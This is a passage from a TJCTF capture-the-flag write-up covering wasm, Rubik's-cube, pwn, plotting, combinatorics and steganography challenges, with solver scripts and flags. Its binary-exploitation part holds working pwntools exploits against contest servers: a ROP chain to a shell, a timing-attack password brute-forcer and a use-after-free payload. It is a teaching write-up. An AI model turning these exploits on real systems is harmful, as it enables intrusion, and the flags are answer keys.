      i32.load8_u offset=27
      i32.const 99
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=28
      i32.const 97
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=29
      i32.const 107
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=30
      i32.const 101
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=31
      i32.const 115
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=32
      i32.eqz
      local.set $var1
    end $label0
    local.get $var1
  )
  (func $func2 (result i32)
    i32.const 1040
    i64.const 9038006696380691298
    i64.store
    i32.const 1032
    i64.const 7596551555448135522
    i64.store
    i32.const 1024
    i64.const 3708568498132445812
    i64.store
    i32.const 1048
    i32.const 0
    i32.store8
    i32.const 1024
  )
  (func $func3 (result i32)
    global.get $global0
  )
  (func $func4 (param $var0 i32)
    local.get $var0
    global.set $global0
  )
  (func $func5 (param $var0 i32) (result i32)
    global.get $global0
    local.get $var0
    i32.sub
    i32.const -16
    i32.and
    local.tee $var0
    global.set $global0
    local.get $var0
  )
  (func $func6 (result i32)
    i32.const 1056
  )
)
```
as you can see
```c
      i32.load8_u offset=1
      i32.const 108
      i32.ne
```
is ASCII code, if u decode it with `i32.load8_u offset=` 1-31, the output should be `blue|tuxedo|dance|chaos|pancakes`

then, we can try to input those chars,

![](lasagnaflag.png)

Flag: `tjctf{w3b_m4d_libs_w4sm}`

### rubix-cube

![](rubixcube.png)

So we got a `rubixcube.py` and `cube_scrambled.txt`\
`rubixcube.py`:
```py
import copy
import random
import numpy as np

class RubiksCube:
    def __init__(self):
        self.faces = {
            'U': [['⬜'] * 3 for _ in range(3)],
            'L': [['🟧'] * 3 for _ in range(3)],
            'F': [['🟩'] * 3 for _ in range(3)],
            'R': [['🟥'] * 3 for _ in range(3)],
            'B': [['🟦'] * 3 for _ in range(3)],
            'D': [['🟨'] * 3 for _ in range(3)]
        }

    def _rotate_face_clockwise(self, face_name):

        face = self.faces[face_name]     

        new_face = [[None] * 3 for _ in range(3)]
        for i in range(3):
            for j in range(3):
                new_face[i][j] = face[2-j][i]
        self.faces[face_name] = new_face 

    def _rotate_face_counter_clockwise(self, face_name):

        face = self.faces[face_name]     

        new_face = [[None] * 3 for _ in range(3)]
        for i in range(3):
            for j in range(3):
                new_face[i][j] = face[j][2-i]
        self.faces[face_name] = new_face 

    def display(self):
        for i in range(3):
            print("      " + " ".join(self.faces['U'][i]))
        for i in range(3):
            print(" ".join(self.faces['L'][i]) + "  " +
                  " ".join(self.faces['F'][i]) + "  " +
                  " ".join(self.faces['R'][i]) + "  " +
                  " ".join(self.faces['B'][i]))
        for i in range(3):
            print("      " + " ".join(self.faces['D'][i]))
        print("-" * 30)

    def get_flat_cube_encoded(self):     
        return "".join([chr(ord(i) % 94 + 33) for i in str(list(np.array(self.faces).flatten())) if ord(i)>256])

    def get_cube(self):
        return self.faces

    def U(self):
        self._rotate_face_clockwise('U') 
        temp_row = copy.deepcopy(self.faces['F'][0])
        self.faces['F'][0] = self.faces['R'][0]
        self.faces['R'][0] = self.faces['B'][0]
        self.faces['B'][0] = self.faces['L'][0]
        self.faces['L'][0] = temp_row    

    def L(self):
        self._rotate_face_clockwise('L') 
        temp_col = [self.faces['U'][i][0] for i in range(3)]
        for i in range(3): self.faces['U'][i][0] = self.faces['B'][2-i][2]        
        for i in range(3): self.faces['B'][2-i][2] = self.faces['D'][i][0]        
        for i in range(3): self.faces['D'][i][0] = self.faces['F'][i][0]
        for i in range(3): self.faces['F'][i][0] = temp_col[i]

    def F(self):
        self._rotate_face_clockwise('F') 
        temp_strip = copy.deepcopy(self.faces['U'][2])
        for i in range(3): self.faces['U'][2][i] = self.faces['L'][2-i][2]        
        for i in range(3): self.faces['L'][i][2] = self.faces['D'][0][i]
        for i in range(3): self.faces['D'][0][2-i] = self.faces['R'][i][0]        
        for i in range(3): self.faces['R'][i][0] = temp_strip[i]

    def D_prime(self):
        self._rotate_face_counter_clockwise('D')
        temp_row = copy.deepcopy(self.faces['F'][2])
        self.faces['F'][2] = self.faces['R'][2]
        self.faces['R'][2] = self.faces['B'][2]
        self.faces['B'][2] = self.faces['L'][2]
        self.faces['L'][2] = temp_row    

    def R_prime(self):
        self._rotate_face_counter_clockwise('R')
        temp_col = [self.faces['U'][i][2] for i in range(3)]
        for i in range(3): self.faces['U'][i][2] = self.faces['B'][2-i][0]        
        for i in range(3): self.faces['B'][2-i][0] = self.faces['D'][i][2]        
        for i in range(3): self.faces['D'][i][2] = self.faces['F'][i][2]
        for i in range(3): self.faces['F'][i][2] = temp_col[i]

    def B_prime(self):
        self._rotate_face_counter_clockwise('B')
        temp_strip = copy.deepcopy(self.faces['U'][0])
        for i in range(3): self.faces['U'][0][i] = self.faces['L'][i][0]
        for i in range(3): self.faces['L'][i][0] = self.faces['D'][2][2-i]        
        for i in range(3): self.faces['D'][2][i] = self.faces['R'][i][2]
        for i in range(3): self.faces['R'][i][2] = temp_strip[2-i]

    def apply_moves(self, moves_string): 
        moves = moves_string.split()     
        for move in moves:
            if move == "U": self.U()     
            elif move == "D'": self.D_prime()
            elif move == "L": self.L()   
            elif move == "R'": self.R_prime()
            elif move == "F": self.F()   
            elif move == "B'": self.B_prime()
            else:
                print(f"Warning: Unknown move '{move}' ignored.")


moves = ["U", "L", "F", "B'", "D'", "R'"]

cube = RubiksCube()

#random scramble
for _ in range(1000):
    cube.apply_moves(moves[random.randint(0,len(moves)-1)])

flag = "tjctf{" + cube.get_flat_cube_encoded() + "}"

first = cube.get_flat_cube_encoded()     

with open("flag.txt", "w",  encoding="utf-8") as f: f.write(flag)

random.seed(42)

for _ in range(20):
    order = [random.randint(0,len(moves)-1) for _ in range(50)]

    for i in range(len(order)):
        cube.apply_moves(moves[order[i]])

with open("cube_scrambled.txt", "w", encoding="utf-8") as f: f.write(str(cube.get_cube()))
```
`cube_scrambled.txt`:
```py
{'U': [['🟨', '🟩', '🟧'], ['🟥', '⬜', '🟦'], ['⬜', '🟧', '🟩']], 'L': [['🟦', '🟩', '🟥'], ['⬜', '🟧', '🟧'], ['🟦', ' ⬜', '🟩']], 'F': [['🟧', '⬜', '🟨'], ['🟦', '🟩', '🟨'], ['🟦', '🟨', '🟩']], 'R': [['⬜', '🟥', '🟦'], ['🟧', '🟥', '🟥'], ['🟧', '🟨', '⬜']], 'B': [['🟧', '⬜', '🟥'], ['🟨', '🟦', '🟥'], ['🟨', '🟩', '🟥']], 'D': [['🟩', '🟦', '⬜'], ['🟦', '🟨', '🟩'], ['🟥', '🟧', '🟨']]}
```
to the point, to construct the flag, the `rubixcube.py` has a method `get_flat_cube_encoded()` that return a string, and it scrambles the cube using 1000 random moves:
```py
scramble_moves_names = ["U", "L", "F", "B'", "D'", "R'"]
random.seed(42)
for _ in range(20):
    for i in [random.randint(0, 5) for _ in range(50)]:
        cube.move(scramble_moves_names[i])
```
the use of `random.seed(42)` means the scramble is deterministic, we can reproduce it.

To solve it, we can copy all function in encryptor, and reversed it, the solver would be like this:
```py
import copy
import random
import numpy as np

class RubiksCube:
    def __init__(self):
        # Initializes a solved cube, not used in the final solver logic
        self.faces = {
            'U': [['⬜'] * 3 for _ in range(3)],
            'L': [['🟧'] * 3 for _ in range(3)],
            'F': [['🟩'] * 3 for _ in range(3)],
            'R': [['🟥'] * 3 for _ in range(3)],
            'B': [['🟦'] * 3 for _ in range(3)],
            'D': [['🟨'] * 3 for _ in range(3)]
        }

    def _rotate_face_clockwise(self, face_name):
        face = self.faces[face_name]
        new_face = [[None] * 3 for _ in range(3)]
        for i in range(3):
            for j in range(3):
                new_face[i][j] = face[2 - j][i]
        self.faces[face_name] = new_face

    def _rotate_face_counter_clockwise(self, face_name):
        face = self.faces[face_name]
        new_face = [[None] * 3 for _ in range(3)]
        for i in range(3):
            for j in range(3):
                new_face[i][j] = face[j][2 - i]
        self.faces[face_name] = new_face
    
    def get_flat_cube_encoded(self):
        # Correctly encodes the cube state to find the flag content
        return "".join([chr(ord(i) % 94 + 33) for i in str(list(np.array(list(self.faces.values())).flatten())) if ord(i) > 256])

    # --- Original Moves ---
    def U(self):
        self._rotate_face_clockwise('U')
        temp_row = copy.deepcopy(self.faces['F'][0])
        self.faces['F'][0] = self.faces['R'][0]
        self.faces['R'][0] = self.faces['B'][0]
        self.faces['B'][0] = self.faces['L'][0]
        self.faces['L'][0] = temp_row

    def L(self):
        self._rotate_face_clockwise('L')
        temp_col = [self.faces['U'][i][0] for i in range(3)]
        for i in range(3): self.faces['U'][i][0] = self.faces['B'][2-i][2]
        for i in range(3): self.faces['B'][2-i][2] = self.faces['D'][i][0]
        for i in range(3): self.faces['D'][i][0] = self.faces['F'][i][0]
        for i in range(3): self.faces['F'][i][0] = temp_col[i]

    def F(self):
        self._rotate_face_clockwise('F')
        temp_strip = copy.deepcopy(self.faces['U'][2])
        for i in range(3): self.faces['U'][2][i] = self.faces['L'][2-i][2]
        for i in range(3): self.faces['L'][i][2] = self.faces['D'][0][i]
        for i in range(3): self.faces['D'][0][2-i] = self.faces['R'][i][0]
        for i in range(3): self.faces['R'][i][0] = temp_strip[i]

    def D_prime(self):
        self._rotate_face_counter_clockwise('D')
        temp_row = copy.deepcopy(self.faces['F'][2])
        self.faces['F'][2] = self.faces['R'][2]
        self.faces['R'][2] = self.faces['B'][2]
        self.faces['B'][2] = self.faces['L'][2]
        self.faces['L'][2] = temp_row

    def R_prime(self):
        self._rotate_face_counter_clockwise('R')
        temp_col = [self.faces['U'][i][2] for i in range(3)]
        for i in range(3): self.faces['U'][i][2] = self.faces['B'][2-i][0]
        for i in range(3): self.faces['B'][2-i][0] = self.faces['D'][i][2]
        for i in range(3): self.faces['D'][i][2] = self.faces['F'][i][2]
        for i in range(3): self.faces['F'][i][2] = temp_col[i]

    def B_prime(self):
        self._rotate_face_counter_clockwise('B')
        temp_strip = copy.deepcopy(self.faces['U'][0])
        for i in range(3): self.faces['U'][0][i] = self.faces['L'][i][0]
        for i in range(3): self.faces['L'][i][0] = self.faces['D'][2][2-i]
        for i in range(3): self.faces['D'][2][i] = self.faces['R'][i][2]
        for i in range(3): self.faces['R'][i][2] = temp_strip[2-i]

    # --- Inverse Moves (Added for Solver) ---
    def U_prime(self):
        self._rotate_face_counter_clockwise('U')
        temp_row = copy.deepcopy(self.faces['F'][0])
        self.faces['F'][0] = self.faces['L'][0]
        self.faces['L'][0] = self.faces['B'][0]
        self.faces['B'][0] = self.faces['R'][0]
        self.faces['R'][0] = temp_row

    def L_prime(self):
        self._rotate_face_counter_clockwise('L')
        temp_col = [self.faces['U'][i][0] for i in range(3)]
        for i in range(3): self.faces['U'][i][0] = self.faces['F'][i][0]
        for i in range(3): self.faces['F'][i][0] = self.faces['D'][i][0]
        for i in range(3): self.faces['D'][i][0] = self.faces['B'][2-i][2]
        for i in range(3): self.faces['B'][2-i][2] = temp_col[i]
        
    def F_prime(self):
        self._rotate_face_counter_clockwise('F')
        temp_strip = copy.deepcopy(self.faces['U'][2])
        for i in range(3): self.faces['U'][2][i] = self.faces['R'][i][0]
        for i in range(3): self.faces['R'][i][0] = self.faces['D'][0][2-i]
        for i in range(3): self.faces['D'][0][i] = self.faces['L'][i][2]
        for i in range(3): self.faces['L'][2-i][2] = temp_strip[i]

    def D(self):
        self._rotate_face_clockwise('D')
        temp_row = copy.deepcopy(self.faces['F'][2])
        self.faces['F'][2] = self.faces['L'][2]
        self.faces['L'][2] = self.faces['B'][2]
        self.faces['B'][2] = self.faces['R'][2]
        self.faces['R'][2] = temp_row

    def R(self):
        self._rotate_face_clockwise('R')
        temp_col = [self.faces['U'][i][2] for i in range(3)]
        for i in range(3): self.faces['U'][i][2] = self.faces['F'][i][2]
        for i in range(3): self.faces['F'][i][2] = self.faces['D'][i][2]
        for i in range(3): self.faces['D'][i][2] = self.faces['B'][2-i][0]
        for i in range(3): self.faces['B'][2-i][0] = temp_col[i]

    def B(self):
        self._rotate_face_clockwise('B')
        temp_strip = copy.deepcopy(self.faces['U'][0])
        for i in range(3): self.faces['U'][0][i] = self.faces['R'][2-i][2]
        for i in range(3): self.faces['R'][i][2] = self.faces['D'][2][i]
        for i in range(3): self.faces['D'][2][2-i] = self.faces['L'][i][0]
        for i in range(3): self.faces['L'][i][0] = temp_strip[i]

cube = RubiksCube()
cube.faces = {'U': [['🟨', '🟩', '🟧'], ['🟥', '⬜', '🟦'], ['⬜', '🟧', '🟩']], 'L': [['🟦', '🟩', '🟥'], ['⬜', '🟧', '🟧'], ['🟦', '⬜', '🟩']], 'F': [['🟧', '⬜', '🟨'], ['🟦', '🟩', '🟨'], ['🟦', '🟨', '🟩']], 'R': [['⬜', '🟥', '🟦'], ['🟧', '🟥', '🟥'], ['🟧', '🟨', '⬜']], 'B': [['🟧', '⬜', '🟥'], ['🟨', '🟦', '🟥'], ['🟨', '🟩', '🟥']], 'D': [['🟩', '🟦', '⬜'], ['🟦', '🟨', '🟩'], ['🟥', '🟧', '🟨']]}

random.seed(42)
scramble_moves_names = ["U", "L", "F", "B'", "D'", "R'"]
scramble_sequence = []
for _ in range(20):
    order = [random.randint(0, len(scramble_moves_names) - 1) for _ in range(50)]
    for i in range(len(order)):
        scramble_sequence.append(scramble_moves_names[order[i]])

inverse_move_map = {
    "U": cube.U_prime,
    "L": cube.L_prime,
    "F": cube.F_prime,
    "B'": cube.B,
    "D'": cube.D,
    "R'": cube.R
}

for move_name in reversed(scramble_sequence):
    inverse_function = inverse_move_map[move_name]
    inverse_function()

flag_content = cube.get_flat_cube_encoded()
flag = "tjctf{" + flag_content + "}"
print(flag)
```

Flag: `tjctf{G>BGG@BBGA>B>@B??>@G?@B??B>>?GA>@G@ABB@A?AA?@?
AA>AG>G@}` dawg i need like ten minutes to realize this the real flag

## Binary Exploitation
### i-love-birds

![](ilovebirds.png)

so we got the c source and the exe program

`birds.c`:
```c
#include <stdio.h>
#include <stdlib.h>           

void gadget() {
    asm("push $0x69;pop %rdi");
}


void win(int secret) {        
    if (secret == 0xA1B2C3D4) {
        system("/bin/sh");    
    }
}


int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    unsigned int canary = 0xDEADBEEF;

    char buf[64];

    puts("I made a canary to stop buffer overflows. Prove me wrong!");
    gets(buf);

    if (canary != 0xDEADBEEF) {
        puts("No stack smashing for you!");
        exit(1);
    }


    return 0;
}
```
As you can see, there is `gets(buf)`, so this is basically buffer overflow, and it is basically just normal `ret2win` but with canary value, 
```
unsigned int canary = 0xDEADBEEF;
```
After passing through the canary, we will overwrite the return address on the stack. However, we cannot jump directly to the win function because we need to supply the argument 0xA1B2C3D4. On the x86-64 architecture, the first argument to a function is passed through the %rdi register.

![](ropgadget.png)

even tho we have the real source, but we still need to disass it, 

![](disass.png)

buf starts at: `rbp - 80`\
canary starts at: `rbp - 4`

The distance is the difference between the two locations:\
`offset = (canary location) - (buf location)`\
`offset = (rbp - 4) - (rbp - 80)`\
`offset = -4 - (-80)`\
`offset = 76`\

and then for `ret` address\
`0x0000000000401285`

so this is the solver:
```py
from pwn import *

elf = context.binary = ELF('./birds')
p = remote('tjc.tf', 31625)
POP_RDI_GADGET = 0x00000000004011c0 
WIN_FUNC_ADDR = 0x00000000004011c4  
SECRET_VALUE = 0xA1B2C3D4
CANARY_VALUE = 0xDEADBEEF
payload = b'A' * 76
payload += p32(CANARY_VALUE)
payload += b'B' * 8
rop_chain = b''
rop_chain += p64(POP_RDI_GADGET) 
rop_chain += p64(SECRET_VALUE)      
rop_chain += b'JUNKJUNK'           
rop_chain += p64(WIN_FUNC_ADDR)        
final_payload = payload + rop_chain
p.recvuntil(b'Prove me wrong!\n')
p.sendline(final_payload)
p.interactive()
```
![](ilovebirdsflag.png)

Flag: `tjctf{1_gu355_y0u_f0und_th3_f4ke_b1rd_ch1rp_CH1rp_cH1Rp_Ch1rP_ch1RP}`

### extra-credit

![](gradeviewer.png)

So we got a exe and the source code

`gradeViewer.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#define MAX_LEN 32
#define FLAG_FILE "./flag.txt"
#define FLAG_SIZE 256

const char *SECRET = "[REDACTED]";

void changeGrade() {
    char buf[FLAG_SIZE];
    memset(buf, 0, FLAG_SIZE);
    FILE *f = fopen(FLAG_FILE, "r");
    if (f == NULL) {
        printf("Missing flag file. \n");
    } else {
        fgets(buf, FLAG_SIZE, f);
        printf("\n");
        printf("Whose grade would you like to change?");
        printf("\n");
        write(STDOUT_FILENO, buf, strlen(buf));
        printf("\n");
    }
    exit(0);
}

void accessMemory() {
    struct timespec ts = {.tv_sec = 0, .tv_nsec = 5000000};
    nanosleep(&ts, NULL);
}

void authenticateTeacher() {
    char input[MAX_LEN];
    printf("\n[TEACHER VIEW] Enter your password [a-z, 0-9]:");
    scanf("%31s", input);

    for (int i = 0; i < strlen(SECRET); i++) {
        accessMemory();
        if (input[i] != SECRET[i]) break;
        accessMemory();
    }

    if (strcmp(input, SECRET) == 0) {
        printf("\nAccess granted.\n");
        changeGrade();
    } else {
        printf("\nInvalid password!\n");
    }
}

void showGrade(int id) {
    switch ((short)id) {
        case 1: printf("Phineas: A+\n"); break;
        case 2: printf("Ferb: A\n"); break;
        case 3: printf("Candace: B+\n"); break;
        case 4: printf("Buford: C\n"); break;
        case 5: printf("Baljeet: A+\n"); break;
        case 6: printf("Isabella: A\n"); break;
        case 7: printf("Perry: P\n"); break;
        case 8: printf("Doofenshmirtz: D\n"); break;
        case 9: printf("Jeremy: B\n"); break;
        case 10: printf("Vanessa: A-\n"); break;
        case 0x0BEE:
            printf("\nAccessing teacher view...\n");
            authenticateTeacher();
            break;
        default:
            printf("Unknown student ID.\n");
    }
}

int main() {
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    int id;
    printf("Welcome to the Tri-State Grade Viewer\n");
    printf("Enter your student ID: ");

    if (scanf("%d", &id) != 1 || id > 10) {
        printf("Invalid student ID.\n");
        int ch;
        while ((ch = getchar()) != '\n' && ch != EOF);
        exit(0);
    }

    showGrade(id);
    return 0;
}
```
So in here,
```C
if (scanf("%d", &id) != 1 || id > 10) {
    printf("Invalid student ID.\n");
    // ...
    exit(0);
}
```
The `main` function contains a check that only allows IDs up to 10:
```C
// in main()
if (scanf("%d", &id) != 1 || id > 10) {
    printf("Invalid student ID.\n");
    exit(0);
}
showGrade(id);
```
However, the `showGrade(id)` function has a hidden entry point for a "teacher view":
```C
// in showGrade()
switch ((short)id) {
    // ... student cases 1-10 ...
    case 0x0BEE:
        printf("\nAccessing teacher view...\n");
        authenticateTeacher();
        break;
```
This `case 0x0BEE:` is our target. It leads to the `authenticateTeacher()` function, which, if passed, calls `changeGrade()` to print the flag.

In this case, we can use `Integer Overflow`, we can calculate this value:
$$
X = 0x0BEE - 2^{16} \\\\
X = 3054 − 65536 \\\\
X = −62482
$$

![](extracredit1.png)

then for the password, we can brute force it with this solver
```py
from pwn import *
import string
import time

BINARY_PATH = './gradeViewer'
CHARSET = string.ascii_lowercase + string.digits

password = ""

log.info("Starting exploit for gradeViewer...")

while True:
    best_char = None
    max_time = 0

    for char in CHARSET:
        p = process(BINARY_PATH, level='error')

        p.sendlineafter(b'Enter your student ID: ', b'-62482')
        p.recvuntil(b'Enter your password [a-z, 0-9]:')

        guess = password + char
        start_time = time.time()
        p.sendline(guess.encode())
        output = p.recvall(timeout=0.2)
        end_time = time.time()
        p.close()

        duration = end_time - start_time

        if b"Access granted" in output:
            password = guess
            log.success(f"Password found: {password}")
            try:
                flag = output.split(b'change?\n')[1].strip()
                log.success(f"FLAG: {flag.decode()}")
            except IndexError:
                log.warning("Failed to auto-parse flag. Printing raw output:")
                print(output.decode())
            exit(0)

        if duration > max_time:
            max_time = duration
            best_char = char

    if best_char:
        password += best_char
        log.info(f"Found character: '{best_char}'. Current password: '{password}'")
    else:
        log.error("Failed to find the next character.")
        log.info("Timing attacks can be unstable. Try running the script again.")
        exit(1)
```

![](extracredit2.png)

then just input all that we got,

![](extracreditflag.png)

Flag: `tjctf{th4nk_y0u_f0r_sav1ng_m3y_grade}`

### city-planning

![](city-planning.png)

So, we got a exe file and the source code

`chall.c`:
```py
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

typedef struct {
    char name[32];
    int numAcres;
    int coordinates[2];
} buildingPlan;

typedef struct {
    int numAcres;
    int coordinates[2];
    int entryCode[8];
} HQPlan;

bool approvePlan(buildingPlan *plan) {
    if (plan->numAcres >= 10) {
        free(plan);
        plan = NULL;
        return false;
    }
    if (plan->coordinates[0] >= 200 || plan->coordinates[1] >= 200) {
        free(plan);
        plan = NULL;
        return false;
    }
    return true;
}

bool approveHQ(HQPlan *plan) {
    if (plan->numAcres >= 100) {
        free(plan);
        plan = NULL;
        return false;
    }
    if (plan->coordinates[0] >= 50 || plan->coordinates[1] >= 50) {
        free(plan);
        plan = NULL;
        return false;
    }
    return true;
}

int main() {
    char buf[32];

    setbuf(stdout, NULL);

    HQPlan *superSecretHQ = malloc(sizeof(HQPlan));
    superSecretHQ->numAcres = rand() % 100 + 10;
    superSecretHQ->coordinates[0] = rand() % 150 + 50;
    superSecretHQ->coordinates[1] = rand() % 150 + 50;
    for (int i = 0; i < 8; i++) {
        superSecretHQ->entryCode[i] = rand() % 100;
    }
    approveHQ(superSecretHQ);

    printf("Welcome to the city planner! You are allowed to plan one building for the city\n");
    buildingPlan *currentBuilding = malloc(sizeof(buildingPlan));

    printf("Enter the name of your building: ");
    fgets(buf, 32, stdin);
    memcpy(currentBuilding->name, buf, 32);

    printf("Enter the size of your building (in acres): ");
    fgets(buf, 32, stdin);
    currentBuilding->numAcres = atoi(buf);

    printf("Enter the east-west coordinate or your building (miles east of the city center): ");
    fgets(buf, 32, stdin);
    currentBuilding->coordinates[0] = atoi(buf);
    printf("Enter the north-south coordinate or your building (miles north of the city center): ");
    fgets(buf, 32, stdin);
    currentBuilding->coordinates[1] = atoi(buf);

    if (!approvePlan(currentBuilding)) {
        printf("Your building was not approved :(\n");
        return 1;
    }

    printf("Your building was approved! Construction will begin within the next 27 years\n\n");
    printf("Since your building was approved, you must be a great architect.\n");     
    printf("Because of this, we'd like to invite you to join the Super Secret Architect's Guild!\n");
    printf("To join the guild, all you have to do is find the planned coordinates of our headquarters\n");

    int guess[2];
    printf("Enter the east-west coordinate: ");
    fgets(buf, 32, stdin);
    guess[0] = atoi(buf);

    printf("Enter the north-south coordinate: ");
    fgets(buf, 32, stdin);
    guess[1] = atoi(buf);

    if (guess[0] != superSecretHQ->coordinates[0] || guess[1] != superSecretHQ->coordinates[1]) {
        printf("Incorrect guess\n");
        return 1;
    }

    printf("Correct! Welcome to the guild!");

    FILE *flagFile = fopen("flag.txt", "r");
    char flag[32];
    fgets(flag, 32, flagFile);

    printf("Here is the password to enter guild HQ: %s", flag);
    return 0;
}
```
from my analysis, there is `Use-After-Free` vuln\
First, the `main` function allocates a chunk for `HQPlan *superSecretHQ` and initializes it with random data. Crucially, the coordinates are always set to a value `>= 50`.\
The program immediately calls `approveHQ(superSecretHQ)`. This function checks if the coordinates are `>= 50`. Since this is always true, it calls `free(superSecretHQ)`, deallocating the memory. The `superSecretHQ` pointer now dangles, pointing to freed memory\
Right after, the program allocates memory for `buildingPlan*currentBuilding`. Since `sizeof(HQPlan)` and `sizeof(buildingPlan)` are identical (44 bytes), the `malloc` implementation (likely using tcache) reuses the exact same memory chunk that was just freed\
The UAF: As a result, both `superSecretHQ` and `currentBuilding` point to the same memory address. We can now control the data of the "secret" HQ by providing input for our own building plan

Now, our goal is to guess `superSecretHQ->coordinates`, we can simply write our own values into that location and then "guess" them\
```py
# Overwrites HQ->numAcres, HQ->coordinates[0], HQ->coordinates[1]
payload = b"\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00" + b"A" * 20
```
A small trick is required cus `fgets(buf, 32, ...)` reads at most 31 chars if we send a newline. Sending 32 byte payload with `sendline` leaves one byte and a newline in the `stdin` buffer.  Then passing checks, we provide valid inputs for out building's size and coordinates (`< 10` and `< 200`) to pass the `aprrovePlan` checks. When prompted to guess the secret coordinates, we simply enter `1` and `1`, the values we just wrote into memory.

This is the full `solver.py`:
```py
from pwn import *

HOST = "tjc.tf"
PORT = 31489
p = remote(HOST, PORT)
payload = b"\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00" + b"A" * 20

p.recvuntil(b"Enter the name of your building: ")
p.sendline(payload)
p.recvuntil(b"Enter the east-west coordinate or your building (miles east of the city center): ")
p.sendline(b"100")
p.recvuntil(b"Enter the north-south coordinate or your building (miles north of the city center): ")
p.sendline(b"100")
p.recvuntil(b"Enter the east-west coordinate: ")
p.sendline(b"1")
p.sendline(b"1")
p.interactive()
```

## Miscellaneous
### Mouse Trails

![](mousetrails.png)

So we got a .txt file called `mouse_movements.txt`\
`mouse_movements.txt`:
```bash
❯ cat mouse_movements.txt | head

731,762

799,704

636,696

720,761

1703,781

1983,731

509,717

1732,802

595,744

556,702 
```
To solve this, we need an library called `matploitlib` for drawing plot from the data, and here it is the solver.
```py
import matplotlib.pyplot as plt

input_file = 'mouse_movements.txt'
x_coords = []
y_coords = []

try:
    with open(input_file, 'r') as f:
        for line in f:
            try:
                x, y = map(int, line.strip().split(','))
                x_coords.append(x)
                y_coords.append(y)
            except ValueError:
                print(f"Melewati baris yang tidak valid: {line.strip()}")

    plt.figure(figsize=(10, 8))
    plt.scatter(x_coords, y_coords, s=5) 
    plt.gca().invert_yaxis()
    plt.title('Visualisasi Pergerakan Mouse')
    plt.xlabel('Koordinat X')
    plt.ylabel('Koordinat Y')
    plt.grid(True)
    plt.savefig('mouse_plot.png')
    plt.show()
```

`output`:

![](mousetrailsflag.png)

Flag: `tjctf{we_love_cartesian_plane}`

### make-groups

![](makegroups.png)

So we got 2 files, `calc.py` and `chall.txt`,\
`calc.py`:
```py
f = [x.strip() for x in open("chall.txt").read().split('\n')]
n = int(f[0])
a = list(map(int, f[1].split()))
m = 998244353

def factorial(n):
    if n==0: return 1
    if n==1: return 1
    return n * factorial(n-1)

def choose(n, r):
    return (factorial(n) // (factorial(r) * factorial(n-r))) % m

ans = 1
for x in a:
    ans *= choose(n, x)
    ans %= m
print(f"tjctf{{{ans}}}")%    
```

and for the chall.txt, it just digusting `random` number (jk)

So, this challenge requires calculating a product of combinations under a prime modulus, $m=998244353$

the `calc.py` has two critical, first the recursive `factorial` function is slow and will cause a `RecursionError` for the large `n` found in the challenge file, and has incorrect modulat arithmetic.

For the solution,\
instead of re-calculating factorials, it precomputes all values up to `n!` and stores them.\
Crucially, it also precomputes the modular multiplicative inverse of each factorial. This is done efficiently by using `Fermat Little Theorem` and use correct modular combinations.

`solver.py`:
```py
MOD = 998244353

def precompute_factorials(n, mod):
    fact = [1] * (n + 1)
    inv_fact = [1] * (n + 1)

    for i in range(1, n + 1):
        fact[i] = fact[i - 1] * i % mod

    # Fermat's Little Theorem for inverse factorial
    inv_fact[n] = pow(fact[n], mod - 2, mod)
    for i in range(n - 1, -1, -1):
        inv_fact[i] = inv_fact[i + 1] * (i + 1) % mod

    return fact, inv_fact

def comb(n, r, fact, inv_fact, mod):
    if r < 0 or r > n:
        return 0
    return fact[n] * inv_fact[r] % mod * inv_fact[n - r] % mod

with open("chall.txt") as f:
    lines = [x.strip() for x in f]
    n = int(lines[0])
    a = list(map(int, lines[1].split()))

fact, inv_fact = precompute_factorials(n, MOD)

ans = 1
for x in a:
    ans = ans * comb(n, x, fact, inv_fact, MOD) % MOD

print(f"tjctf{{{ans}}}")
```

Flag: `tjctf{148042038}`

## Forensic
### hidden-message

![](hiddenmessage.png)

So we got image file called `suspicious.png`, the title is looks the hint, `hidden-message`, then i checked it with zsteg, and i found this

![](hiddenmessageflag.png)

Flag: `tjctf{steganography_is_fun}`

### deep-layers

![](deeplayers.png)

So we got a .png file, and the word `layers` is means we need to use `zsteg` again,

![](deplayer.png)

as you can see, there is zip file and also some `base64` pattern, so lets just decode the `base64` first,

![](deplayerbes.png)

then i dumped the zip file inside the image using `foremost` and extract it

![](deplayerextract.png)

we got a file called `secret.gz`, decompress it with command `gzip -d`, and u will get the flag

Flag: `tjctf{p0lygl0t_r3bb1t_h0l3}`

### footprint

![](footprint.png)

So we got a zip file,

![](footprintzip.png)

after extracted, i got a file called `.DS_Store`

>A .DS_Store file, short for Desktop Services Store, is a hidden file on macOS that stores information about a folder's view settings, such as icon size, arrangement, and sorting. It's automatically created by the macOS Finder when you browse a folder and is usually invisible within the Finder itself

then i use online DS_Store Converter.
```
